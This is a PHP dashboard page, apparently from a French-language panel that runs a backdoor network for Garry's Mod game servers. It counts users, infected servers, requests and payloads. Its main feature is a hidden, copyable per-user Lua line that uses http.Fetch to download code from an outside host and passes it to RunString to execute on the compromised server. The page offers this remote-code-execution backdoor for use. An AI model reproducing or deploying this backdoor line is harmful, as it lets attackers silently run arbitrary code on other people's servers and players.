<?php
include 'navbar.php';
?>

<div class="fixed-navbar">
<div class="pull-left">
<h1 class="page-title"></h1>
</div>
<div class="pull-right">
<!--<div class="control-item" data-toggle="modal" data-target="#boostrapModal-internalchat"><span class="ico-item mdi mdi-comment-text notice-alarm"></span></div>-->
</div>
<div class="pull-right">

<div class="ico-item" data-toggle="modal" data-target="#boostrapModal-reglement">
<a href="#" class="ico-item mdi mdi-newspaper" data-target="#searchform-header"></a>
</div>

</div>
</div><?php echo
        "
        <script>

        function hidelink()
{
    if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[http://gblk.ga/f?k=".$_SESSION['id']."]],RunString)end)'){
        $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[http://gblk.ga/f?k=".$_SESSION['id']."]],RunString)end)');
        document.getElementById('fez').textContent='CACHER';
    }else{
        $('#copyfetch').val('HIDDEN LINK');
        document.getElementById('fez').textContent='VOIR';
    }
}

    function fetchurlcopy()
{
    if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[http://gblk.ga/f?k=".$_SESSION['id']."]],RunString)end)'){
        $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[http://gblk.ga/f?k=".$_SESSION['id']."]],RunString)end)');
    let copyText = document.getElementById('copyfetch' );
    copyText.select();
    document.execCommand('copy');
    $('#copyfetch').val('HIDDEN LINK');
    }else{
        let copyText = document.getElementById('copyfetch' );
    copyText.select();
    document.execCommand('copy');
    }
}

        </script>
        "; ?>

<div id="wrapper">
<div class="main-content">

<!-- AFFICHAGE DES STATS -->

<div class="col-lg-3 col-md-6 col-xs-12">
    <div class="box-content">
        <div class="statistics-box with-icon">
            <i class="ico fa fa-users text-primary"></i>
            <h2 class="counter text-primary"><?php echo $GLOBALS['DB']->Count("users"); ?></h2>
            <p class="text">NOMBRES D'UTILISATEURS</p>
        </div>
    </div>
</div>
<div class="col-lg-3 col-md-6 col-xs-12">
    <div class="box-content">
        <div class="statistics-box with-icon">
            <i class="ico fa fa-server text-primary"></i>
            <h2 class="counter text-primary"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => $_SESSION['id']]); ?></h2>
            <p class="text">SERVEURS</p>
        </div>
    </div>
</div>
<div class="col-lg-3 col-md-6 col-xs-12">
    <div class="box-content">
        <div class="statistics-box with-icon">
            <i class="ico fa fa-cloud text-primary"></i>
            <h2 class="counter text-primary" id="request-stat"><?php echo Stats::GetValue("nbreqs"); ?></h2>
            <p class="text">REQUETES</p>
        </div>
    </div>
</div>
<div class="col-lg-3 col-md-6 col-xs-12">
    <div class="box-content">
        <div class="statistics-box with-icon">
            <i class="ico fa fa-code text-primary"></i>
            <h2 class="counter text-primary"><?php echo $GLOBALS['DB']->Count("payload"); ?></h2>
            <p class="text">PAYLOADS</p>
        </div>
    </div>
</div>

<!-- BACKDOOR LUARUN -->

<div class="col-lg-6 col-xs-12">
    <div class="box-content card white">
        <h4 class="box-title"><i class="ico small fa fa-code"></i> LuaRun</h4>
        <div class="card-content">
            <h5>Permanente</h5>
            <div class="input-group margin-bottom-20">
                <input class="form-control" value='HIDDEN LINK' id="copyfetch" readonly>
                <div class="input-group-btn">
                    <button id="button_hide" type="button" class="btn btn-primary text-white no-border dropdown-toggle" onclick="hidelink();">
                        <span id="fez">VOIR</span>
                    </button>
                    <button type="button" class="btn btn-primary text-white no-border dropdown-toggle" onclick="fetchurlcopy()">
                        <span>COPIER</span>
                    </button>
                </div>
            </div>
            <div align="center">⚠ <b>Allez sur le lien == Ban</b> ⚠</div>
        </div>
    </div>
</div>

<!-- LAST MEMBER -->

<div class="col-lg-6 col-xs-6">
    <div class="box-content card white">
        <h4 class="box-title"><i class="ico small fa fa-user"></i> Nouveaux Membres</h4>
        <div class="card-content">
            <table class="table">
            <thead>
            <tr>
            <th><i>Nom</i></th>
            </tr>
            </thead>
            <tbody>
            <?php
            $selectionserver = $GLOBALS['DB']->GetContent("users", [], "ORDER BY id DESC");
            $pah = 0;
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    { if($pah != 7) {
                    $pah = $pah + 1;
                    if($AfficheServer["discord"] != "") { 
                        $d = json_decode(html_entity_decode($AfficheServer["discord"]));

                        echo 
                        "
                            <tr>
                                <td><img src='https://cdn.discordapp.com/avatars/" . $d->id ."/". $d->avatar . ".png?size=128' style='border-radius:100%;width:40px;'>
                                " . htmlspecialchars($AfficheServer['username']) . "</td>
                            </tr>
                        ";

                    }else{

                        echo 
                        "
                            <tr>
                                <td><img src='" . $AfficheServer['pdp'] . "' style='border-radius:100%;width:40px;'>
                                " . htmlspecialchars($AfficheServer['username']) . "</td>
                            </tr>
                        ";

                        } 
                    }
                    }
            ?>
            </tbody>
            </table>
        </div>
    </div>
</div>

<!-- BEST MEMBER -->

<div class="col-lg-6 col-xs-6">
    <div class="box-content card white">
        <h4 class="box-title"><i class="ico small fa fa-server"></i> Nombre de nouveaux serveurs </h4>
        <div class="card-content">
            <table class="table">
            <thead>
            <tr>
            <th><i>Nom</i></th>
            <th><i>Nombre</i></th>
            </tr>
            </thead>
            <tbody>
            <?php
            $selectionserver = $GLOBALS['DB']->GetContent("users");
            $pahh = 0;
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    { if($pahh != 7) {
                    $pahh = $pahh + 1;
                    if($AfficheServer["discord"] != "" || $AfficheServer["pdp"] == "") { 
                        $d = json_decode(html_entity_decode($AfficheServer["discord"]));

                        echo 
                        "
                            <tr>
                                <td><img src='https://cdn.discordapp.com/avatars/" . $d->id ."/". $d->avatar . ".png?size=128' style='border-radius:100%;width:40px;'>
                                " . htmlspecialchars($AfficheServer['username']) . "</td>
                                <td>" . $GLOBALS['DB']->Count("server_list", ["userid" => $AfficheServer['id']]) . "</td>
                            </tr>
                        ";

                    }else{

                        echo 
                        "
                            <tr>
                                <td><img src='" . $AfficheServer['pdp'] . "' style='border-radius:100%;width:40px;'>
                                " . htmlspecialchars($AfficheServer['username']) . "</td>
                                <td>" . $GLOBALS['DB']->Count("server_list", ["userid" => $AfficheServer['id']]) . "</td>
                            </tr>
                        ";

                        } 
                    }
                    }
            ?>
            </tbody>
            </table>
        </div>
    </div>
</div>

</div>
</div>

<!-- JAVASCRIPT -->

<script>

function fetchurlcopy2() 
{
    let copyText = document.getElementById("copyfetch2");
    copyText.select();
    document.execCommand("copy");
}


</script>


<!-- OVERLAY -->

<?php include 'get_down.php'; ?>

<script>

const checkboxs = document.getElementsByClassName("alt-checkbox");
for (let i = checkboxs.length - 1; i >= 0; --i)
{
    checkboxs[i].addEventListener("click", () => {
        checkboxs[i].children[0].checked = !checkboxs[i].children[0].checked;
    });
}

</script>

<script src="assets/scripts/jquery.min.js"></script>
<script src="https://cdn.datatables.net/v/bs/jq-3.3.1/dt-1.10.18/datatables.min.js"></script>
<script src="assets/scripts/modernizr.min.js"></script>
<script src="assets/scripts/bootstrap.min.js"></script>
<script src="assets/plugin/nprogress/nprogress.js"></script>
<script src="assets/scripts/main.min.js"></script>
</body>
</html>

